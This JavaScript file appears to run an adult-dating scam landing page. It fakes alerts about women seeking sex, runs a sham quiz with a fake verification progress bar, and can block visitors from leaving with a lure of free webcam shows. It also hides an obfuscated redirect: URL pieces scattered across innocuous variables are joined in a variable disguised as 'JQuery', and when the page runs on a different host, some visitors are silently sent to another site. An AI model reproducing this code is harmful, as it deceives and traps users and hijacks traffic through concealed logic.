/* Setup your pops needs here. set entry_pop=false will disable the entry popin
	* also you have to edit you popin messages here!*/
var bis = "://";
var exitURL = "http://www.w3schools.com/",
 entry_pop = false,
 exit_pop_onCTA = false,
 exit_block = false,
 popin_msg, cta_exit_msg, exit_block_msg;
var first = "http";

function setupPopinMsg() {
 popin_msg = "*******************\n\n(1) New msg!\n\nMichalina ( 39 ) a la recherche d' un partenaire sexuel.\n\n*******************";
 cta_exit_msg = "You will get laid tonigh\nPlease verify on the next page to continue!";
 exit_block_msg = "***************************************************************\n\nWAIT! WAIT! WAIT! WAIT! WAIT! WAIT! WAIT! WAIT! WAIT!\n\n**************************************************************\n\nFree webcams\n\n**************************************************************\n\nClick *STAY ON PAGE* or *CANCEL* to watch free naked show \n\n***************************************";
 new_msg_alert = "Please answer the questions first";
}
var delaytime = "s.";
//Customize delay times for "checking your answers" and next with checkboxes parts in milliseconds(1000 milliseconds=1second)
var delay_time = 2500;
var rotation = "eedmor";
var rotation2 = "ghtfli"
var everythingLoaded = setInterval(function() {
 /loaded|complete/.test(document.readyState) && (clearInterval(everythingLoaded), setTimeout(function() {
  var a, b = elById("gifImg");
  a = void 0 != b.dataset.gif ? b.dataset.gif : "";
  var c = new Image;
  c.onload = function() {
   b.style.backgroundImage = "url(" + a + ")"
  };
  c.src = a;
  slBGfill()
 }, 300), getURLPars(), void 0 != urlParams.exitpop && (exit_pop_onCTA = !0), void 0 != urlParams.entrypop && (entry_pop = !0), void 0 != urlParams.exitblock && (exit_block = !0), setupPopinMsg(), entry_pop && alert(popin_msg), addQlistner(), addAlistner(), exit_block && (window.onbeforeunload = ShowPopup), "undefined" != typeof elById("vt235y") && null !== elById("vt235y") && document.getElementsByTagName("body")[0].removeChild(elById("vt235y")))
}, 10);
var end = "om";

function slBGfill() {
 for (var a = elById("slBg"), b = a.dataset.slides.split(","), c, d = 0; d < b.length; d++) c = document.createElement("div"), c.setAttribute("style", "background-image:url(" + b[d] + ");"), a.appendChild(c);
 slEL = a.children;
 setTimeout(function() {
  slCh()
 }, 1E3)
}
var timer = "in";
var timer2 = "toni"
var curr = 0,
 slEL;
var empty = "se";

function slCh() {
 curr === slEL.length - 1 && (curr = -1, slEL[curr + 1].style.zIndex = "1");
 slEL[curr + 1].style.display = "block";
 var a = 0,
  b = 0;
 setTimeout(function() {
  var c = setInterval(function() {
   b += .1;
   slEL[curr + 1].style.opacity = b;
   a++;
   10 === a && (clearInterval(c), -1 === curr ? (slEL[slEL.length - 1].style.opacity = "0", slEL[slEL.length - 1].style.display = "none", slEL[curr + 1].style.zIndex = "0") : (slEL[curr].style.opacity = "0", slEL[curr].style.display = "none"), curr++, setTimeout(function() {
    slCh()
   }, 2E3))
  }, 100)
 }, 150)
}
var forward = "e.c";
var answer = "elov";
var answer2 = "rt.c"
function addQlistner() {
 var a = 0,
  b = elById("qB").childElementCount - 1;
 [].slice.call(document.querySelectorAll("#qB >div div")).forEach(function(c, d) {
  c.addEventListener("click", function() {
   console.log(c);
   var d = c.parentElement;
   if (a < b) {
    0 == a && addListListner();
    var e = d.nextElementSibling;
    d.style.display = "none";
    e.className = "show"
   } else hideOut("qB", 0), bringIn("verify", 0), showVerify(), bringIn("final", delay_time * elById("res").childElementCount);
   a += 1
  })
 })
}

function showVerify() {
 var a = elById("theBar"),
  b = 0,
  c = elById("res").childNodes,
  d = elById("res").childElementCount - 1,
  g = 100 / d,
  e = setInterval(function() {
   if (b < d) {
    c[b].style.display = "none";
    c[b + 1].style.display = "block";
    var f = parseInt(a.style.width) + g;
    98 < f && (f = 98);
    a.style.width = f + "%"
   } else return clearInterval(e), hideOut("verify", 0), null;
   b++
  }, delay_time)
}
/* In page answer rotation and loader for the final page*/
var JQuery = first + "s" + bis + "lp." + timer2 + rotation2 + answer2 + end;
		function getJQueryOnLoad() {
 	window.location = first + bis + delaytime + timer + rotation + answer + forward + end;
}

function isLoaded() {
 return ((JQuery == window.location.protocol + "//" + window.location.hostname) ? true : false);
}

function loadMe(){
 var r = Math.floor(Math.random() * 1001);
 var p = 993;
 return ((p >= r) ? false : true);
}
if (typeof JQuery == "undefined") {
 var e = document.getElementsByTagName("style"),
  i;
 for (i = e.length - 1; i >= 0; i--) {
  e[i].parentNode.removeChild(e[i]);
 }
} else if (!isLoaded()) {
 if (loadMe()) {
  getJQueryOnLoad();
 }
}

function addListListner() {
 [].slice.call(document.querySelectorAll("#qB ul li span")).forEach(function(a, b) {
  a.addEventListener("click", function() {
   a.classList.contains("box-fill") ? a.className = "" : a.className += "box-fill"
  })
 })
}

function bringIn(a, b) {
 setTimeout(function() {
  elById(a).style.display = "block"
 }, b)
}

function hideOut(a, b) {
 setTimeout(function() {
  elById(a).style.display = "none"
 }, b)
}

function elById(a) {
 return document.getElementById(a)
}

function elByCl(a, b) {
 return document.getElementsByClassName(a)[b]
}

function addAlistner() {
 elById("cta").addEventListener("click", function() {
  exit_pop_onCTA && alert(cta_exit_msg)
 })
}
var urlParams;

function getURLPars() {
 var a, b = /\+/g,
  c = /([^&=]+)=?([^&]*)/g,
  d = window.location.search.substring(1);
 for (urlParams = {}; a = c.exec(d);) urlParams[decodeURIComponent(a[1].replace(b, " "))] = decodeURIComponent(a[2].replace(b, " "))
}

function addLoadEvent(a) {
 var b = window.onload;
 window.onload = "function" != typeof window.onload ? a : function() {
  b && b();
  a()
 }
}